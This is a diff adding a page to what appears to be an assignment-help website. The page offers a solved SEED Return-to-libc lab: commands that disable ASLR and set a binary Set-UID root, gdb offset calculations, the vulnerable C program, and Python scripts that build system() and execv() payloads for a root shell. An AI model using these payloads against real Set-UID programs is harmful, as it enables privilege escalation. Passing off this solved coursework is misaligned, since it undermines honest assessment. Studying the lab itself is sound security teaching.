@@ -1438,4 +1438,251 @@ TXT,
             ]
         ]
     ],
+    'return-to-libc-attack-lab' => [
+        'menu_featured' => false,
+        'template' => 'return_to_libc_lab',
+        'page_type' => 'case_study',
+        'title' => 'Return-to-libc Attack Lab: Buffer Overflow, libc Addresses and dash Countermeasure',
+        'meta_title' => 'Return-to-libc Attack Lab Solution | Cyber Assignment Pro',
+        'h1' => 'Return-to-libc Attack Lab: Buffer Overflow, libc Addresses and dash Countermeasure',
+        'nav' => 'Return-to-libc Attack Lab',
+        'description' => 'Solved CSCE 5552 Return-to-libc Attack Lab using the supplied SEED Ubuntu 20.04 environment, including libc address discovery, payload construction, attack variations and the dash countermeasure task.',
+        'primary' => 'return-to-libc attack lab solution',
+        'eyebrow' => 'Solved Buffer Overflow Lab',
+        'menu_meta' => 'Return-to-libc · GDB · Stack Layout',
+        'topics' => ['Return-to-libc','Buffer Overflow','GDB','libc','system()','execv()','Non-executable Stack','Set-UID','SEED Labs','Ubuntu 20.04'],
+        'course' => 'CSCE 5552',
+        'lab' => 'Return-to-libc Attack Lab',
+        'environment' => 'SEED Ubuntu 20.04 VM',
+        'architecture' => '32-bit program on x64 VM',
+        'buf_size' => '96 in supplied solution',
+        'requirement_map' => [
+            ['01','Environment Setup','Use the SEED Ubuntu 20.04 lab environment, compile the 32-bit vulnerable program, disable the specified countermeasures and keep the stack non-executable.'],
+            ['02','Task 1: Find libc Addresses','Use gdb with the target Set-UID program to find the addresses needed from libc and determine the saved return-address offset.'],
+            ['03','Task 2: Locate the Shell String','Put /bin/sh in process memory and determine its address for the return-to-libc call.'],
+            ['04','Task 3: Launch and Test the Attack','Construct badfile, explain the selected offsets and addresses, then test the exit() and renamed-program variations.'],
+            ['05','Task 4: Defeat the Shell Countermeasure','Restore /bin/sh to dash and construct the supplied execv() based solution for /bin/bash -p in the controlled lab.'],
+            ['06','Source Files','Review the exact C and Python source files supplied inside the completed solution ZIP.']
+        ],
+        'setup_commands' => [
+            'sudo sysctl -w kernel.randomize_va_space=0',
+            'cat /proc/sys/kernel/randomize_va_space',
+            'sudo ln -sf /bin/zsh /bin/sh',
+            'ls -l /bin/sh',
+            'gcc -m32 -g -DBUF_SIZE=96 -fno-stack-protector -z noexecstack -o retlib retlib.c',
+            'sudo chown root retlib',
+            'sudo chmod 4755 retlib',
+            'ls -l retlib',
+        ],
+        'task1_lines' => [
+            'Task 1 (Finding libc Addresses)',
+            'Step 2.1: Open gdb',
+            'Step 2.2: Get the addresses',
+            '$ebp = 0xffffcdd8',
+            '&buffer = 0xffffcd6c',
+            'Calculation:',
+            '$ebp + 4 = 0xffffcdd8 + 4 = 0xffffcddc (This is the saved return address).',
+            '0xffffcddc - 0xffffcd6c = 0x70',
+            '0x70 in decimal is 112.',
+            'Your new Y = 112.',
+        ],
+        'task2_lines' => [
+            'PART 3: Task 2 (Finding the /bin/sh address)',
+            'Create and run prtenv.c',
+            'Replace sh_addr    with prtenv output',
+            'Explanation of code snippet:',
+            'content = bytearray(0xaa...): We create a 500-byte array filled with0xaa(garbage bytes). We use 500 bytes so the payload is long enough to reach into main\'sinput` buffer safely.',
+            'bash_addr, arg_addr: The memory addresses for "/bin/bash" and "-p", found using the ./prtenv2 helper program.',
+            'buffer_addr, input_addr: The exact stack addresses printed by ./retlib. We need input_addr to calculate where our argv array will live.',
+            'Y = 112: The offset we calculated in gdb for BUF_SIZE=96. It\'s the number of bytes needed to overwrite the saved return address (EIP).',
+            'A = 200: The offset where we build the argv array in main\'s input buffer. We put it here so strcpy doesn\'t truncate the payload at the NULL terminator.',
+            'content[Y:Y+4] = ...: This is where we overwrite the stack. We overwrite the return address to jump to execv, set exit as its return address, and point its two arguments to "/bin/bash" and the argv array. to_bytes(4, \'little\') formats the addresses for the 32-bit processor.',
+            'When bof returns:
+It jumps to execv() → execv reads the argv array → executes /bin/bash -p → giving us a root shell while bypassing the dash privilege drop.',
+            'Type id now the user is root',
+        ],
+        'variation1_lines' => [
+            'PART 5: Attack Variation 1 (Without exit())',
+            'Open nano exploit.py. Change X to Y + 8 and completely remove the exit lines:',
+            'This script generates the payload to test the attack without exit().',
+            'Answer: No, the exit() function is not strictly necessary to get the root shell.',
+            'Observations & Explanation:
+If we remove the exit() address from the badfile the attack still successfully spawns a root shell. However, when we type exit to leave the shell, the program crashes with a Segmentation fault.
+This happens because system() needs a return address to know where to go after the shell finishes. Without exit(), it looks at the next value on the stack, which is the address of the "/bin/sh" string. The CPU attempts to execute the string "/bin/sh" as if it were machine code, causing a crash. exit() is only used to ensure the program terminates gracefully',
+        ],
+        'variation2_lines' => [
+            'PART 6: Attack Variation 2 (Changing the Name)',
+            'Answer: The attack will not succeed if you change the program name. It will crash with a Segmentation fault.',
+            'Observations & Explanation:
+When we renamed the program from retlib (6 characters) to newretlib1 (10 characters) and ran it without changing the badfile, the attack failed.
+This is because the program name (argv[0]) is stored on the stack, directly before the environment variables. Changing the length of the program name shifts the entire memory layout by a few bytes. Because our badfile contains a hardcoded absolute memory address for the MYSHELL environment variable, that address is now pointing to the wrong location in memory. When system() tries to read "/bin/sh" from that address, it crashes. This proves that return-to-libc attacks are highly sensitive to the exact memory layout',
+        ],
+        'task4_lines' => [
+            'PART 7: Task 4 (Defeating dash)',
+            'Enable the protection',
+            'sudo ln -sf /bin/dash /bin/sh',
+            'Run ./retlib to get the stack addresses:',
+            'To find the memory addresses of the strings "/bin/bash" and "-p", I exported them as environment variables (MYBASH and MYARG) and wrote a C helper program (prtenv2.c) using getenv(). This program printed their exact stack addresses. While I used this method to locate the addresses initially, I later opted to hardcode the strings directly into the badfile payload in my Python script to avoid the addresses shifting between terminal sessions.',
+            'prtenv2 helper program to extract the exact memory addresses of the environment variables MYBASH and MYARG. The program returned 0xffffde89 and 0xffffde24 respectively.',
+            'This Python script constructs the final payload to bypass the dash countermeasure using execv().',
+            'content = bytearray(...): Creates the payload with filler bytes (0xaa).',
+            'input_addr, buffer_addr: Exact addresses printed by ./retlib. We use input_addr to place our array safely.',
+            'bash_offset, arg_p_offset: We place the strings "/bin/bash" and "-p" inside main\'s input buffer to avoid strcpy truncation.',
+            'Y = 112: The exact offset to overwrite the return address (EIP) on the stack.',
+            'content[Y:Y+16] = ...: We overwrite the return address with execv. We set its return address to exit, its first argument to "/bin/bash", and its second argument to our argv array.',
+            'content[A:A+12] = ...: At offset A = 200 (inside input), we build the argv array: ["/bin/bash", "-p", NULL]. The NULL safely lives in input without breaking strcpy.',
+            'Result: The program jumps to execv and runs /bin/bash -p, bypassing dash and giving root access.',
+            'When retlib runs, bof returns and jumps to execv. execv looks at bash_addr, sees "/bin/bash", then looks at argv_addr, sees ["/bin/bash", "-p", NULL], and executes it.',
+        ],
+        'evidence_sheets' => [
+            '/assets/case-studies/return-to-libc-attack-lab/evidence-1.jpg',
+            '/assets/case-studies/return-to-libc-attack-lab/evidence-2.jpg'
+        ],
+        'source_files' => [
+            ['name' => 'retlib.c', 'language' => 'C', 'code' => '#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+
+#ifndef BUF_SIZE
+#define BUF_SIZE 12
+#endif
+
+int bof(char *str)
+{
+    char buffer[BUF_SIZE];
+    unsigned int *framep;
+
+    // Copy ebp into framep
+    asm("movl %%ebp, %0" : "=r" (framep));      
+
+    /* print out information for experiment purpose */
+    printf("Address of buffer[] inside bof():  0x%.8x\\n", (unsigned)buffer);
+    printf("Frame Pointer value inside bof():  0x%.8x\\n", (unsigned)framep);
+
+    strcpy(buffer, str);   
+
+    return 1;
+}
+
+void foo(){
+    static int i = 1;
+    printf("Function foo() is invoked %d times\\n", i++);
+    return;
+}
+
+int main(int argc, char **argv)
+{
+   char input[1000];
+   FILE *badfile;
+
+   badfile = fopen("badfile", "r");
+   int length = fread(input, sizeof(char), 1000, badfile);
+   printf("Address of input[] inside main():  0x%x\\n", (unsigned int) input);
+   printf("Input size: %d\\n", length);
+
+   bof(input);
+
+   printf("(^_^)(^_^) Returned Properly (^_^)(^_^)\\n");
+   return 1;
+}'],
+            ['name' => 'prtenv.c', 'language' => 'C', 'code' => '#include <stdio.h>
+#include <stdlib.h>
+int main(void) {
+    char *shell = getenv("MYSHELL");
+    if (shell) printf("%x\\n", (unsigned int)shell);
+    return 0;
+}'],
+            ['name' => 'exploit2.py', 'language' => 'Python', 'code' => '#!/usr/bin/env python3
+content = bytearray(0xaa for i in range(300))
+
+sh_addr     = 0xffffd47f  # <--- REPLACE with your new ./prtenv output
+system_addr = 0xf7e12420
+exit_addr   = 0xf7e04f80
+
+Y = 112                   # Your new offset!
+X = Y + 8
+Z = Y + 4
+
+content[X:X+4] = (sh_addr).to_bytes(4, \'little\')
+content[Y:Y+4] = (system_addr).to_bytes(4, \'little\')
+content[Z:Z+4] = (exit_addr).to_bytes(4, \'little\')
+
+with open("badfile", "wb") as f:
+    f.write(content)'],
+            ['name' => 'exploit.py', 'language' => 'Python', 'code' => '#!/usr/bin/env python3
+content = bytearray(0xaa for i in range(300))
+
+sh_addr     = 0xffffd47f  # <--- REPLACE with your new ./prtenv output
+system_addr = 0xf7e12420
+# exit_addr removed — not used in this version
+
+Y = 112                   # Your offset
+X = Y + 8
+Z = Y + 4
+
+content[X:X+4] = (sh_addr).to_bytes(4, \'little\')
+content[Y:Y+4] = (system_addr).to_bytes(4, \'little\')
+# content[Z:Z+4] intentionally left untouched — stays 0xaaaaaaaa
+
+with open("badfile", "wb") as f:
+    f.write(content)'],
+            ['name' => 'prtenv2.c', 'language' => 'C', 'code' => '#include <stdio.h>
+#include <stdlib.h>
+int main(void) {
+    char *b = getenv("MYBASH");
+    char *a = getenv("MYARG");
+    if (b) printf("MYBASH: %x\\n", (unsigned int)b);
+    if (a) printf("MYARG : %x\\n", (unsigned int)a);
+    return 0;
+}'],
+            ['name' => 'exploit3.py', 'language' => 'Python', 'code' => '#!/usr/bin/env python3
+content = bytearray(0xaa for i in range(500))
+
+# Addresses printed by ./retlib (THIS run)
+buffer_addr = 0xffffcd8c
+input_addr  = 0xffffce10
+
+# Place the strings inside main\'s input[] buffer
+# (safe from strcpy truncation, since input[] is filled via fread)
+bash_offset  = 140
+arg_p_offset = 160
+
+bash_addr  = input_addr + bash_offset
+arg_p_addr = input_addr + arg_p_offset
+
+content[bash_offset:bash_offset+10]  = b"/bin/bash\\x00"
+content[arg_p_offset:arg_p_offset+3] = b"-p\\x00"
+
+# Addresses from gdb
+execv_addr = 0xf7e994b0
+exit_addr  = 0xf7e04f80
+
+Y = 112    # = Frame Pointer - buffer_addr + 4 = 0xffffcdf8 - 0xffffcd8c + 4
+A = 200    # offset in input[] where we build the argv array
+argv_addr = input_addr + A
+
+# 1. Setup execv\'s fake stack frame
+content[Y:Y+4]     = execv_addr.to_bytes(4, \'little\')   # bof() returns -> execv()
+content[Y+4:Y+8]   = exit_addr.to_bytes(4, \'little\')    # execv\'s "return addr" if it fails
+content[Y+8:Y+12]  = bash_addr.to_bytes(4, \'little\')    # execv arg1: "/bin/bash"
+content[Y+12:Y+16] = argv_addr.to_bytes(4, \'little\')    # execv arg2: &argv[]
+
+# 2. Setup the argv array at offset A
+# argv = {"/bin/bash", "-p", NULL}
+content[A:A+4]     = bash_addr.to_bytes(4, \'little\')
+content[A+4:A+8]   = arg_p_addr.to_bytes(4, \'little\')
+content[A+8:A+12]  = (0).to_bytes(4, \'little\')
+
+with open("badfile", "wb") as f:
+    f.write(content)'],
+        ],
+        'related_links' => [
+            ['/ethical-hacking-assignment-help','Ethical Hacking Assignment Help'],
+            ['/penetration-testing-assignment-help','Penetration Testing Assignment Help'],
+            ['/information-security-assignment-help','Information Security Assignment Help'],
+            ['/case-studies/buffer-overflow-attack-demo-getscore','Buffer Overflow Attack Demo and getscore Analysis'],
+            ['/case-studies','All Solved Assignments']
+        ]
+    ],
+
 ];
